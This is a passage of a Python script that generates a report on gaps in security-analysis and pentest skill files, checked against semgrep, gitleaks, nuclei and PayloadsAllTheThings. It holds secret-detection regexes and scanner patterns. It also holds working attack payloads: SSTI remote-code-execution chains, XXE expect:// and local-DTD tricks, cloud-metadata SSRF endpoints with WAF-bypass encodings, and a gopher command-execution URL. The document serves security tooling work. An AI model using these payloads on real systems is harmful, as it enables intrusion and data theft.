#!/usr/bin/env python3
"""Generate the skills-improvement HTML report from structured findings."""
from pathlib import Path
import datetime
import html
import json

DATE = "2026-06-02"

REPOS = [
    ("swisskyrepo/PayloadsAllTheThings", "22M", "Offensive payload corpus — per-class payloads, bypasses, oracles", "vulns, exploit, auth"),
    ("semgrep/semgrep-rules", "24M", "Taint-mode static rules: per-language sources / sinks / sanitizers", "trace, vuln_scan"),
    ("projectdiscovery/nuclei-templates", "97M", "Detection templates — encode oracle / matcher logic per class", "exploit, vuln_scan, vulns"),
    ("OWASP/wstg", "34M", "Web Security Testing Guide — methodology per class", "all"),
    ("1ndianl33t/Gf-Patterns", "276K", "tomnomnom-style grep/regex sink patterns", "vuln_scan"),
    ("gitleaks/gitleaks", "3.6M", "222 high-precision secret-detection regexes", "trace, vuln_scan"),
    ("likec4/likec4", "89M", "Upstream LikeC4 source, grammar, docs, examples (v1.57.0)", "likec4"),
]

# Each finding: title, file, gap, evidence, rec (recommendation), pri (high/medium/low)
SKILLS = {
"trace": {
  "blurb": "Static trace-and-annotate taint analysis: trace request-derived values to sinks, identify missing controls, classify findings (Shape A/B/C). Compared against semgrep-rules taint models, gitleaks secret regexes, and OWASP WSTG.",
  "findings": [
    {"title":"Missing XXE / XML-parsing sink category","file":"references/sinks.md + cwe-mapping.md","pri":"high",
     "gap":"No XML/XXE sink anywhere. `parser.process` is the only generic parser label; no `parser.xml` / external-entity concept, no safe-flag sanitizer guidance, and CWE-611 is absent from the mapping. XXE is one of the most common static-analysis findings in Java/.NET/PHP.",
     "evidence":"semgrep-rules has ~20 XXE rules: java/lang/security/xmlinputfactory-possible-xxe.yaml, csharp/.../xxe/xmldocument-unsafe-parser-override.yaml, xmltextreader-unsafe-defaults.yaml. The Java rule keys on missing hardening flags: isSupportingExternalEntities=false and XMLConstants.FEATURE_SECURE_PROCESSING.",
     "rec":"Add allowed label `parser.xml.unsafe` (vs `parser.xml`) and a sinks row:\n### parser.xml.unsafe — XML parser created without disabling DTD/external entities (no disallow-doctype-decl, no FEATURE_SECURE_PROCESSING; .NET XmlResolver not null; PHP no libxml_disable_entity_loader/LIBXML_NONET); tainted XML body parsed -> XXE (file read / SSRF) -> CWE-611.\nAdd cwe-mapping row: | XML External Entity (XXE) | CWE-611 | parser.xml.unsafe |"},
    {"title":"`http.response.header` label referenced but not in allowed-labels list","file":"references/sinks.md","pri":"high",
     "gap":"cwe-mapping.md maps Header Injection (CWE-113) to sink `http.response.header`, but that label is not in the allowed-labels block in sinks.md and has no per-sink row. An LLM told to use an exact label cannot legally emit the label cwe-mapping tells it to use. No CRLF / Response-Splitting coverage either.",
     "evidence":"WSTG 07-Input_Validation_Testing/15-Testing_for_HTTP_Response_Splitting.md and 17-Testing_for_Host_Header_Injection.md. Internal mismatch: cwe-mapping.md:20 vs sinks.md allowed-list :10-26.",
     "rec":"Add `http.response.header` to the allowed-labels block, plus a row:\n### http.response.header — tainted value written into a response header / Location / Set-Cookie name or value; CR/LF not stripped -> Response Splitting / Header Injection (CWE-113).\nAdd a tainted-source note for request.Host used to build links/reset URLs (host-header trust)."},
    {"title":"Deserialization sinks omit dominant Java/.NET mechanics","file":"references/sinks.md","pri":"high",
     "gap":"Deserialization coverage is Python-centric (parser.pickle, parser.yaml.unsafe, serializer.decode). Never names Java ObjectInputStream.readObject, Jackson polymorphic typing, or .NET BinaryFormatter/LosFormatter/NetDataContractSerializer — the highest-impact RCE deserialization sinks in enterprise code.",
     "evidence":"java/lang/security/jackson-unsafe-deserialization.yaml (keys on $OM.enableDefaultTyping() before readValue), java/rmi/security/server-dangerous-object-deserialization.yaml, the whole csharp/lang/security/insecure-deserialization/ dir (binary-formatter, los-formatter, net-data-contract, soap-formatter, newtonsoft).",
     "rec":"In the deserialization row add: Also treat as unsafe-deserialization sinks: Java ObjectInputStream.readObject, Jackson with enableDefaultTyping()/@JsonTypeInfo; .NET BinaryFormatter/LosFormatter/NetDataContractSerializer/JavaScriptSerializer with a type resolver; Newtonsoft with TypeNameHandling != None. Safe forms (plain JsonConvert, DataContractSerializer with known types) are not this sink."},
    {"title":"Shape C secrets coverage has no recognizable token shapes","file":"references/finding-shapes.md","pri":"high",
     "gap":"Shape C says 'hardcoded secrets' but gives zero concrete fingerprints, so it relies entirely on variable naming (API_KEY=). High-entropy literals with provider prefixes are recognizable on sight and catch secrets naming heuristics miss.",
     "evidence":"gitleaks/config/gitleaks.toml (222 rules). Highest-signal eyeball-matchable prefixes.",
     "rec":"Add a 'Hardcoded-secret fingerprints (any string literal matching -> Shape C, CWE-798, even without a suggestive var name)' table:\nAKIA…/ASIA… (AWS), ghp_…/github_pat_… (GitHub), glpat-… (GitLab), AIza… (Google), sk-ant-api03-… (Anthropic), sk-…T3BlbkFJ… (OpenAI), xoxb-/xoxp- (Slack), sk_live_/rk_live_ (Stripe), SG. (SendGrid), npm_…, -----BEGIN … PRIVATE KEY-----, ey…\\.ey…\\. (JWT).\nFP guard: a *_test_* Stripe key or obvious placeholder is low/info, not high."},
    {"title":"Uploaded-file write sink missing despite upload being a named source","file":"references/sinks.md + cwe-mapping.md","pri":"medium",
     "gap":"sources.md lists 'multipart upload filename and content' as tainted, but no sink closes the loop: writing uploaded content to a path derived from the upload filename (arbitrary write / unrestricted type / traversal via filename).",
     "evidence":"WSTG 07-Input_Validation_Testing/11-Testing_for_File_Inclusion.md plus java/lang/security/httpservlet-path-traversal.yaml, whose sanitizer is FilenameUtils.getName(...).",
     "rec":"Extend filesystem.* row: Uploaded files — if the destination path uses the client-supplied filename (multipart), require basename()/FilenameUtils.getName AND an extension/content-type allowlist; absence -> Unrestricted Upload (CWE-434)/arbitrary write. Add CWE-434 to cwe-mapping."},
    {"title":"Prototype pollution missing (JS/TS taint to object-merge)","file":"references/sinks.md + cwe-mapping.md","pri":"medium",
     "gap":"No sink models a tainted key reaching a recursive merge / obj[key]=val assignment — the JS prototype-pollution mechanic (CWE-1321/915).",
     "evidence":"javascript/lang/security/audit/prototype-pollution/prototype-pollution-assignment.yaml (pattern $X[$B]=... where $B tainted) and prototype-pollution-loop.yaml.",
     "rec":"Add label `reflect.proto`:\n### reflect.proto — tainted key in obj[key]=v, deep-merge, Object.assign, or _.merge with no __proto__/constructor/prototype key denylist -> Prototype Pollution (CWE-1321)."},
    {"title":"No JS sandbox-escape / dynamic-code sinks beyond plain eval","file":"references/sinks.md","pri":"medium",
     "gap":"reflect.eval is the only code-exec sink. Misses Node sandbox-escape and headless-browser code-injection sinks.",
     "evidence":"javascript/vm2/security/audit/vm2-code-injection.yaml, express-sandbox-injection.yaml, puppeteer-evaluate-code-injection.yaml, shelljs-exec-injection.yaml.",
     "rec":"In reflect.eval row add: Node equivalents also reflect.eval: new Function(str), vm.runInContext/runInNewContext, vm2 .run(), puppeteer/playwright page.evaluate(str)/addInitScript/setContent. vm/vm2 are NOT real sandboxes — tainted code reaching them is RCE (CWE-94)."},
    {"title":"No CORS-misconfiguration finding","file":"references/finding-shapes.md + controls.md","pri":"medium",
     "gap":"Control checklist has no CORS row, and no shape covers reflecting Origin / setting Access-Control-Allow-Origin: * with Allow-Credentials: true.",
     "evidence":"javascript/express/security/cors-misconfiguration.yaml (req.headers -> Access-Control-Allow-Origin, CWE-346) and python/fastapi/security/wildcard-cors.yaml.",
     "rec":"Add Shape C bullet: CORS reflects request Origin into Access-Control-Allow-Origin, or uses * with Allow-Credentials: true -> Origin Validation Error (CWE-346). Add control row `cors` and CWE-346 to mapping."},
    {"title":"Frameworks reference missing Express/NestJS and Laravel","file":"references/frameworks.md","pri":"medium",
     "gap":"Routing/DI patterns documented only for Spring, Django, Go/gorilla-mux. No guidance for Express/NestJS (middleware order, req.query/body sources) or Laravel (route middleware groups, Eloquent raw vs builder, $request->all() mass-assignment).",
     "evidence":"Largest security-rule dirs in semgrep-rules are javascript/express/security/ and php/laravel/security/ (laravel-sql-injection.yaml, express/security/audit/express-ssrf.yaml, remote-property-injection.yaml).",
     "rec":"Add an Express/NestJS section (sources req.query|body|params|headers|cookies; auth in app.use/route middleware — open it; sinks res.redirect, child_process.exec, sequelize raw) and a Laravel section (->middleware() groups; DB::raw/whereRaw = db.query.raw vs builder = db.query; Model::create($request->all()) = mass assignment)."},
    {"title":"No CSV / formula injection in exported responses","file":"references/finding-shapes.md + cwe-mapping.md","pri":"low",
     "gap":"No notion of formula injection — tainted data in a CSV/XLSX export beginning with = + - @, executed when opened in a spreadsheet.",
     "evidence":"WSTG 07-Input_Validation_Testing/21-Testing_for_CSV_Injection.md.",
     "rec":"Add sink label `export.csv`:\n### export.csv — tainted field written to CSV/spreadsheet export without neutralizing leading = + - @ \\t \\r -> CSV/Formula Injection (CWE-1236). Add CWE-1236 to mapping."},
    {"title":"CWE-mapping XSS sink label doesn't match sinks catalogue","file":"references/cwe-mapping.md","pri":"low",
     "gap":"XSS maps to sink `response (unfiltered)`, not an allowed label — real labels are template.render.raw / html.render. Stored vs reflected not distinguished; DOM XSS absent.",
     "evidence":"Internal mismatch cwe-mapping.md:14 vs allowed-labels sinks.md:10-26. Semgrep distinguishes server template XSS (flask/security/unescaped-template-extension.yaml) from client-side.",
     "rec":"Change the XSS row sink label to template.render.raw / html.render. Note DOM XSS (tainted -> innerHTML/document.write/dangerouslySetInnerHTML) is also CWE-79 with sink html.render on the client path."},
  ]},
"vuln_scan": {
  "blurb": "Static vulnerability scanning: grep dangerous sinks, detect MISSING controls, per-endpoint checklist. Heavily covers PHP/WordPress. Compared against semgrep-rules, Gf-Patterns, nuclei-templates exposures, and gitleaks.",
  "findings": [
    {"title":"No Ruby / Rails coverage at all","file":"references/sink-patterns.md + grep-patterns.md","pri":"high",
     "gap":"Sink patterns cover Python/Java/Go/Node/PHP but Ruby is entirely absent. Rails has many high-signal idiomatic sinks (RCE via reflection/eval/send, mass assignment, dynamic render LFI, SQLi via interpolation, deserialization) the generic patterns miss — same way PHP/WP did.",
     "evidence":"semgrep-rules ruby/lang/security/dangerous-exec.yaml, no-send.yaml (send/public_send/__send__/try), rails/security/check-unsafe-reflection.yaml (constantize), bad-deserialization*.yaml (Marshal.load, YAML.load, Oj.load), check-render-local-file-include.yaml, tainted-sql-string.yaml, mass-assignment-vuln.yaml, avoid-raw/avoid-html-safe.",
     "rec":"Add a Ruby/Rails block:\nRCE: \\b(system|exec|spawn|eval|Open3\\.(capture|popen)|IO\\.popen|PTY\\.spawn)\\b ; reflection \\b(constantize|safe_constantize)\\b, \\.(send|public_send|__send__|try)\\(\nSQLi: \\.where\\(\".*#\\{ , \\.find_by_sql\\( , interpolation #{...} inside where(/order(/pluck(\nDeser: Marshal\\.load, YAML\\.load (vs safe_load), Oj\\.(object_)?load\nMass assign: permit! , attr_accessible , Model.new(params[\nRender/LFI: render\\s+(file|inline|template|action):\\s*params\nXSS: \\.html_safe , raw( , <%=="},
    {"title":"No C# / .NET coverage","file":"references/sink-patterns.md","pri":"high",
     "gap":".NET is a major web stack and is completely uncovered — SQLi, command exec, LDAP/XPath injection, insecure deserialization, XXE all have distinct sink names.",
     "evidence":"csharp/lang/security/sqli/csharp-sqli.cs, injections/os-command.cs, dotnet/ldap-injection.cs, xpath-injection.cs, insecure-binaryformatter-deserialization.yaml, xxe/*.",
     "rec":"Add .NET sinks:\nSQLi: new SqlCommand( , ExecuteReader/NonQuery/Scalar , string.Format/$\"...{var}\" into command text — SAFE: SqlParameter/cmd.Parameters.Add\nCmd: Process.Start( , ProcessStartInfo UseShellExecute=true\nLDAP: DirectorySearcher/DirectoryEntry Filter built by concat — SAFE Encoder.LdapFilterEncode\nXPath: SelectNodes/SelectSingleNode/XPathNavigator.Compile with concat\nDeser: BinaryFormatter, LosFormatter, SoapFormatter, NetDataContractSerializer, JavaScriptSerializer, Newtonsoft TypeNameHandling != None\nRazor XSS: @Html.Raw( ; SSRF: HttpClient/WebRequest.Create(userUrl)"},
    {"title":"SSTI / template injection missing as a vuln class","file":"references/sink-patterns.md + grep-patterns.md","pri":"high",
     "gap":"No server-side template injection patterns despite it being RCE-grade across Python/Go/Node/.NET/Ruby. Skill only covers output-side XSS for PHP.",
     "evidence":"python/flask/security/dangerous-template-string.yaml + render_template_string, go-ssti.yaml, javascript/express/security/express-insecure-template-usage, csharp razor-template-injection, ruby avoid-render-inline. Gf-Patterns ssti.json lists param sources.",
     "rec":"Add a CRITICAL SSTI section:\nPython/Flask: render_template_string( , Template(...).render( , Environment(...).from_string( with user input; autoescape=False\nGo: text/template (NOT html/template) rendering user data; template.HTML(userInput)\nNode: mustache/handlebars with escaping disabled, eval-based engines, dot/ejs <%-\nConfirm user input reaches the template STRING, not just the data context."},
    {"title":"XXE not covered","file":"references/sink-patterns.md","pri":"high",
     "gap":"XML external entity injection (file read / SSRF) has no patterns despite distinctive, greppable sink+config signatures per language.",
     "evidence":"java/lang/security/audit/xxe/* (DocumentBuilderFactory/SAXParserFactory/XMLInputFactory/TransformerFactory without disallow-doctype-decl), csharp xmltextreader-unsafe-defaults.yaml, Node express-libxml-noent, PHP LIBXML_NOENT.",
     "rec":"Add XXE section — VULNERABLE when these parse user XML without disabling DOCTYPE/entities: Java DocumentBuilderFactory/SAXParserFactory/XMLInputFactory/TransformerFactory (flag if no setFeature('...disallow-doctype-decl', true)/FEATURE_SECURE_PROCESSING); .NET XmlTextReader/XmlReaderSettings DtdProcessing=Parse; PHP simplexml_load_*/DOMDocument->load* with LIBXML_NOENT / libxml_disable_entity_loader(false); Node libxmljs {noent:true}, xml2json."},
    {"title":"Secrets sweep relies on one weak regex — import gitleaks patterns","file":"references/grep-patterns.md + miss-patterns.md","pri":"high",
     "gap":"Only secret grep is password.*=.*\" etc., missing cloud/provider tokens and private keys, poor precision. A project-wide secret sweep is a stated workflow step (index.md step 3).",
     "evidence":"gitleaks/config/gitleaks.toml (222 rules).",
     "rec":"Add high-precision regexes:\nAWS: \\b((?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z2-7]{16})\\b\nGitHub PAT: ghp_[0-9a-zA-Z]{36} ; github_pat_\\w{82}\nGCP/Firebase: \\bAIza[\\w-]{35}\\b\nSlack bot: xoxb-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*\nStripe: \\b(?:sk|rk)_(?:test|live|prod)_[a-zA-Z0-9]{10,99}\\b\nOpenAI: sk-[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}\nAnthropic: sk-ant-api03-[a-zA-Z0-9_-]{93}AA\nJWT: \\bey[a-zA-Z0-9]{17,}\\.ey[a-zA-Z0-9/_-]{17,}\\.[a-zA-Z0-9/_-]{10,}\nPrivate key: -----BEGIN[ A-Z0-9_-]{0,100}PRIVATE KEY\nKeep the existing password= form as a low-confidence fallback."},
    {"title":"Sensitive files committed to repo not checked","file":"index.md (step 3) + miss-patterns.md","pri":"medium",
     "gap":"Static scan should flag secrets/config files present in the tree, not only secrets in code. No glob for .env, dumps, key files, vendored backups.",
     "evidence":"nuclei-templates http/exposures/configs/ (aws-credentials, codeigniter-env, composer-config) and exposures/backups/ (*.sql, php-backup-files, wordpress-db-exposure).",
     "rec":"Add a sweep step: glob **/.env*, **/*.pem|*.key|*.p12|*.pfx|id_rsa, **/*.{sql,sql.gz,dump,bak,backup}, **/wp-config.php, **/credentials*, **/.git/config, **/.aws/credentials, **/*.{kdbx,keystore}. Any tracked match = CWE-538/CWE-312 (exclude .example/.sample/test fixtures)."},
    {"title":"Node.js sink list is thin","file":"references/sink-patterns.md","pri":"medium",
     "gap":"Node only has SQLi + a generic SSRF entry. High-frequency Node bugs (child_process, prototype pollution, CORS, deserialization, fs/require) absent.",
     "evidence":"detect-child-process.yaml, audit/prototype-pollution/*, express/security/cors-misconfiguration.yaml, detect-eval-with-expression, detect-non-literal-require, detect-non-literal-fs-filename, vm2-injection.",
     "rec":"Add Node sinks:\nCmd: child_process.exec(/execSync( with concat — SAFE execFile/spawn arg array, no shell\nCode: eval(, new Function(, vm.runInContext, require( with a variable, setTimeout(string)\nProto pollution: obj[userKey]=val, recursive merge/_.merge/Object.assign of untrusted JSON — flag __proto__/constructor/prototype keys\nDeser: node-serialize.unserialize(, funcster, js-yaml load (vs safeLoad)\nPath/fs: fs.readFile/createReadStream(req...), res.sendFile(userPath)"},
    {"title":"CORS / security-header misconfiguration not in checklist or sinks","file":"references/sink-patterns.md + checklist.md + miss-patterns.md","pri":"medium",
     "gap":"Permissive CORS (* with credentials, reflected Origin) and missing security controls aren't checked, though greppable in every framework.",
     "evidence":"semgrep-rules */security/*cors* across Java/PHP/Python/Node/.NET (flask-cors-misconfiguration, permissive-cors.java, php-permissive-cors, express cors-misconfiguration, nestjs-header-cors-any).",
     "rec":"Add a CORS/Header-misconfig pattern: VULNERABLE = Access-Control-Allow-Origin: * (or echoing request Origin) combined with Allow-Credentials: true. Grep: Allow-Origin.*\\*, setAllowedOrigins?\\([\"']?\\*, cors\\(\\) with no options, origin: true, CORS_ORIGIN_ALLOW_ALL = True. Add checklist row cors_policy for credentialed responses."},
    {"title":"JWT/auth patterns miss CSRF protection disabled / missing","file":"references/sink-patterns.md + checklist.md","pri":"medium",
     "gap":"CSRF (state-changing endpoints without anti-forgery) isn't a tracked control; skill mentions WP nonce only.",
     "evidence":"ruby missing-csrf-protection.yaml, rails-skip-forgery-protection.yaml; csharp mvc-missing-antiforgery; javascript detect-no-csrf-before-method-override, express-check-csurf-middleware-usage; Django @csrf_exempt.",
     "rec":"Add CSRF detection: grep @csrf_exempt, csrf_exempt, skip_before_action :verify_authenticity_token, protect_from_forgery ... except, [IgnoreAntiforgeryToken], missing csurf on Express POST routes. Add checklist row csrf for cookie-authenticated state-changing endpoints."},
    {"title":"Go-specific sinks beyond SQLi/cmd missing","file":"references/sink-patterns.md","pri":"medium",
     "gap":"Go coverage is SQLi + exec only. text/template SSTI, open redirect, exposed net/http/pprof debug endpoint, Zip Slip are distinct Go issues.",
     "evidence":"go/... rule ids go-ssti, go-insecure-templates, open-redirect, pprof-debug-exposure (audit/net/pprof.yaml), tainted-url-host (SSRF), path-traversal-inside-zip-extraction.",
     "rec":"Add Go: SSTI — text/template for HTML output / template.HTML(userInput); Open redirect — http.Redirect(w,r,userURL,...); Debug exposure — import _ \"net/http/pprof\" or /debug/pprof on a public mux; Zip Slip — filepath.Join(dest, f.Name) during extraction without .. check."},
    {"title":"Weak-crypto pattern doesn't flag MD5/SHA1 as password hash","file":"references/grep-patterns.md + miss-patterns.md","pri":"low",
     "gap":"Skill flags md5/sha1 generically and plaintext passwords, but not the common 'MD5/SHA1 as the password hashing function' (distinct, higher severity, CWE-916).",
     "evidence":"ruby/.../md5-used-as-password.yaml, javascript/.../md5-used-as-password; cross-language md5-used-as-password.",
     "rec":"In Weak Crypto add: (md5|sha1|sha256)( applied to a password/passwd variable, or hashlib.md5(password, MessageDigest.getInstance(\"MD5\") near auth -> CWE-916. SAFE: bcrypt/argon2/scrypt/PBKDF2. (Plain SHA-256 of a password is still weak — no salt/work factor.)"},
  ]},
"vulns": {
  "blurb": "Offensive testing playbooks for IDOR, SSRF, SSTI, XXE (discovery, fingerprint, payloads, bypass, escalation, remediation). Compared against PayloadsAllTheThings, nuclei DAST templates, and WSTG.",
  "findings": [
    {"title":"SSTI missing Java engine RCE chains (Pebble, Jinjava, SpEL/OGNL)","file":"references/ssti.md","pri":"high",
     "gap":"Engine table names Pebble/Thymeleaf and methodology covers FreeMarker/Velocity/Groovy, but there are no concrete RCE payloads for Pebble, Jinjava, SpEL, or OGNL — the four highest-value modern Java SSTI sinks. Pebble >=3.0.9 needs a reflection chain the skill lacks.",
     "evidence":"PayloadsAllTheThings 'Server Side Template Injection/Java.md' (Pebble, Jinjava, SpEL, OGNL sections).",
     "rec":"Add to the FreeMarker/Velocity block:\nPebble (>=3.0.9): {% set bytes=(1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id').inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}\nJinjava: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"...ProcessBuilder...\")}}\nOGNL/SpEL: ${T(java.lang.Runtime).getRuntime().exec('id')} and OGNL (#rt=@java.lang.Runtime@getRuntime()).exec('id')"},
    {"title":"XXE missing local-DTD reuse for error-based exfil (no-OOB)","file":"references/xxe.md","pri":"high",
     "gap":"All OOB/error-based exfil assume the parser can reach an attacker-hosted external DTD. No fallback for fully-restricted egress, where you repurpose a DTD already on disk (fonts.dtd) to redefine an internal parameter entity and trigger error-based leakage — the canonical technique when outbound HTTP is blocked.",
     "evidence":"PayloadsAllTheThings 'XXE Injection/README.md' -> 'Error Based - Using Local DTD File' (Linux /usr/share/xml/fontconfig/fonts.dtd); GoSecure/dtd-finder.",
     "rec":"Add a 'Local DTD Reuse (no egress)' subsection: fonts.dtd payload overriding <!ENTITY % constant ...> to inject %file;/%eval;/%error;, plus Windows path file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd, and note `locate .dtd` / dtd-finder for discovery."},
    {"title":"SSRF cloud-metadata missing AWS IPv6, recursive GCP, more providers","file":"references/ssrf.md","pri":"high",
     "gap":"Missing AWS IMDS IPv6 endpoint (works when IPv4 169.254.169.254 is filtered), GCP ?recursive=true one-shot dump and v1beta1 header-less endpoints, AWS Lambda runtime API, K8s ETCD :2379, Hetzner, Rancher. Skill lists IPv4 variants only.",
     "evidence":"PayloadsAllTheThings 'Server Side Request Forgery/SSRF-Cloud-Instances.md'.",
     "rec":"Add: AWS IPv6 http://[fd00:ec2::254]/latest/meta-data/ ; GCP http://metadata.google.internal/computeMetadata/v1/?recursive=true and header-less .../v1beta1/?recursive=true ; AWS Lambda http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next ; K8s ETCD http://127.0.0.1:2379/v2/keys/?recursive=true"},
    {"title":"SSRF metadata IP-encoding/overflow bypass table incomplete","file":"references/ssrf.md","pri":"high",
     "gap":"Has decimal/octal/hex for 127.0.0.1 but lacks the 169.254.169.254-specific overflow/mixed-encoding set used to dodge metadata-IP WAFs, plus nip.io/instance-data DNS tricks.",
     "evidence":"SSRF-Cloud-Instances.md -> AWS 'Encoding the IP to bypass WAF'.",
     "rec":"Add a metadata-specific bypass block: dotless-decimal 2852039166, hex-overflow 0x41414141A9FEA9FE, mixed octal+decimal 0251.254.169.254, IPv6-mapped [::ffff:a9fe:a9fe], DNS forms 169.254.169.254.nip.io / instance-data."},
    {"title":"IDOR lacks concrete predictable-ID structures (UUIDv1, MongoID)","file":"references/idor.md","pri":"high",
     "gap":"Skill repeatedly says 'predict GUIDs/UUIDs' but never explains how. The two reliably-predictable formats — UUIDv1 (time+MAC, sandwich attack) and MongoDB ObjectId (epoch+machine+pid+counter) — are missing.",
     "evidence":"PayloadsAllTheThings 'Insecure Direct Object References/README.md' -> 'Weak Pseudo Random Number Generator'.",
     "rec":"Add under ID Obfuscation Bypass: UUIDv1 = timestamp+clock_seq+node(MAC); if you can mint your own (registration timestamp known), sandwich the victim's creation window (uuidtools). MongoDB ObjectId = 4-byte epoch + 3-byte machine + 2-byte pid + 3-byte incrementing counter -> enumerate counter once two IDs known. Also timestamp/epoch-as-ID enumeration."},
    {"title":"SSTI missing Elixir (EEx/HEEx/LEEx) engine","file":"references/ssti.md","pri":"medium",
     "gap":"No coverage of Phoenix/Elixir templating (EEx, LEEx, HEEx) — increasingly common in production and trivially RCE-able. Engine table and fingerprint list omit it.",
     "evidence":"PayloadsAllTheThings 'Server Side Template Injection/Elixir.md'.",
     "rec":"Add a row: EEx/HEEx/LEEx (Elixir/Phoenix) — format <%= %>; detect <%= 7*7 %> -> 49; RCE <%= elem(System.shell(\"id\"), 0) %>; time-based <%= elem(System.shell(\"id && sleep 5\"),0) %>."},
    {"title":"XXE missing UTF-16/UTF-7 encoding WAF bypass","file":"references/xxe.md","pri":"medium",
     "gap":"Filter-evasion section has case variation and URL-encoding but not the byte-encoding bypass where the whole doc is converted to UTF-16BE/LE so signature WAF rules (<!ENTITY, <!DOCTYPE) never match the raw bytes.",
     "evidence":"XXE Injection/README.md -> 'WAF Bypasses -> Bypass via Character Encoding' (iconv -f UTF-8 -t UTF-16BE).",
     "rec":"Add under Filter Evasion: Convert payload to UTF-16: cat exploit.xml | iconv -f UTF-8 -t UTF-16BE > out.xml (parser auto-detects via BOM FE FF); defeats WAFs matching <!ENTITY/<!DOCTYPE as ASCII. Mention UTF-7 for legacy parsers."},
    {"title":"XXE-via-SVG only shows file read, missing expect:// RCE","file":"references/xxe.md","pri":"medium",
     "gap":"SVG upload payloads only demonstrate file:// text read. The higher-impact <image xlink:href=\"expect://ls\"> vector (PHP expect wrapper inside SVG) gives direct command execution from an image upload.",
     "evidence":"XXE Injection/README.md -> 'XXE Inside SVG'.",
     "rec":"Add to the SVG section: <image xlink:href=\"expect://id\" width=\"200\" height=\"200\"/> (requires PHP expect ext) and the php://filter/convert.base64-encode/resource= xlink:href variant for source read."},
    {"title":"SSRF gopher exploitation limited to Redis","file":"references/ssrf.md","pri":"medium",
     "gap":"Gopher section only shows Redis. High-impact gopher RCE targets (FastCGI -> PHP RCE, uWSGI, Zabbix system.run, MySQL/Memcached unauth) absent, and no pointer to Gopherus.",
     "evidence":"PayloadsAllTheThings 'SSRF-Advanced-Exploitation.md' (FastCGI, Memcached, MySQL, SMTP, Zabbix, WSGI; gopherus.py).",
     "rec":"Add: FastCGI gopher RCE one-liner, Zabbix gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D, and 'generate with gopherus.py --exploit {fastcgi,mysql,redis,pymemcache,smtp}'."},
    {"title":"SSTI string-less RCE uses hard-coded subclass index","file":"references/ssti.md","pri":"medium",
     "gap":"String-less example pins __subclasses__()[104]. The skill warns indexes vary but gives no copy-ready index-free loop.",
     "evidence":"PayloadsAllTheThings 'Server Side Template Injection/Python.md' (subclass-by-name search).",
     "rec":"In String-less Exploitation add the robust form: {% for x in ().__class__.__base__.__subclasses__() %}{% if \"Popen\" in x.__name__ %}{{ x('id',shell=True,stdout=-1).communicate() }}{% endif %}{% endfor %} — avoids fragile numeric indices."},
    {"title":"IDOR wildcard-ID technique under-specified","file":"references/idor.md","pri":"low",
     "gap":"Skill mentions 'Wildcard Testing' with only *. Multiple wildcard chars (%, ., _) different backends/ORMs expand into 'return all records'.",
     "evidence":"IDOR/README.md -> 'Wildcard Parameter' (GET /api/users/*, /%, /_, /.).",
     "rec":"Expand Wildcard Testing: try *, %, _, . as the entire ID (GET /api/users/%) — SQL LIKE/regex backends may dump all rows."},
    {"title":"XXE blind-DoS missing parameter-entity laugh + YAML bomb","file":"references/xxe.md","pri":"low",
     "gap":"DoS section has Billion Laughs + Quadratic Blowup but not the parameter-entity laugh (works where general-entity expansion is capped but parameter entities aren't) nor the YAML-bomb variant for XML->YAML pipelines.",
     "evidence":"XXE Injection/README.md -> 'Parameters Laugh Attack' and 'YAML Attack'.",
     "rec":"Add 'Parameter Entity Laugh' (<!ENTITY % a \"...\"> nested expansion) as a fallback when general-entity expansion is limited, and a note that XML-fronted YAML parsers are vulnerable to YAML anchor bombs."},
  ]},
"exploit": {
  "blurb": "Concrete HTTP probe recipes to confirm/refute findings on a LIVE target: smallest-credible-probe payloads, oracle patterns, proof-of-exploitation ladder (L1-L4). Compared against nuclei DAST matcher logic, PayloadsAllTheThings, and WSTG.",
  "findings": [
    {"title":"SQLi error oracle too narrow — adopt nuclei's multi-engine regex bank","file":"references/sqli.md","pri":"high",
     "gap":"Error-signature table lists ~5 prose strings per engine. Real apps wrap DB errors in driver/ORM exceptions the table misses (PDO, JDBC class names, SQLSTATE[...], ORM wrappers), causing false negatives that push verdicts to not_exploitable when an error actually fired.",
     "evidence":"nuclei-templates/dast/vulnerabilities/sqli/sqli-error-based.yaml — regex bank covering 25+ engines incl. org.postgresql.util.PSQLException, com.mysql.jdbc, sqlite3.OperationalError:, SQLSTATE[...], ORA-#####. Note its negative matcher \"Adminer\" to suppress a known FP.",
     "rec":"Replace the prose table with a regex set (grep body, case-insensitive). Catch-alls so any one fires: org\\.(postgresql|sqlite|h2|hsqldb)\\. , com\\.(mysql|microsoft\\.sqlserver|ibm\\.db2)\\.jdbc , Pdo[./_\\\\](Mysql|Pgsql|Sqlite|Oracle) , SQLSTATE\\[\\d+\\] , \\bORA-\\d{5} , sqlite3\\.OperationalError , PSQLException|MySqlException|SQLiteException|DB2Exception. An ORM/driver exception class in the body is L2 error-based proof even without a 'SQL syntax' string."},
    {"title":"SSTI 7*7->49 oracle is collision-prone — use randomized factors","file":"references/ssti.md, index.md","pri":"high",
     "gap":"{{7*7}}->49 is a weak oracle: 49/7 appear naturally in many pages, so a 'match' can be a false positive, and a benign reflection of 49 is indistinguishable from eval.",
     "evidence":"nuclei dast/vulnerabilities/ssti/reflection-ssti.yaml uses first/second=rand_int(1000,9999), result=first*second, and a polyglot set wrapping the expression in every delimiter ({{ }}, ${ }, <%= %>, #{ }, ${{ }}, [[ ]], @( ), {@ }, #set($x=…)${x}) with one matcher: body contains result.",
     "rec":"Change quick-confirm: pick two 4-digit randoms a,b; send the chosen delimiter wrapping a*b; oracle = the 7-8 digit product (e.g. 4127*8093) appears in the body. A 7-digit number you never sent cannot be coincidental -> deterministic verdict in one request. Keep 7*'7' only as the post-confirm Jinja2-vs-Twig fingerprint. Add the delimiter polyglot list as the one-shot engine sweep."},
    {"title":"File-read oracle should be a regex, not a literal first line","file":"references/path-traversal.md, xxe.md, ssrf.md","pri":"high",
     "gap":"Skill keys the /etc/passwd oracle on literal root:x:0:0:. Hardened images differ, and partial reads / HTML-escaping break a literal substring — yielding false negatives.",
